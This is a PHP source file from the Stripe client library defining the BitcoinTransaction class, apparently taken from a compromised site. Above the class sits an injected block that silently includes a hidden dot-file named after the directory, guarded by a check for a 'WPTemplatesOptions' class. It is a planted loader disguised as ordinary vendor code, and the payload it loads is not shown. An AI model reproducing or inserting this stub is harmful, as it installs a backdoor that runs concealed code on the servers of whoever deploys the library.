<?php

namespace Stripe;

/**
 * Class BitcoinTransaction
 *
 * @package Stripe
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BitcoinTransaction extends ApiResource
{

    const OBJECT_NAME = "bitcoin_transaction";
}
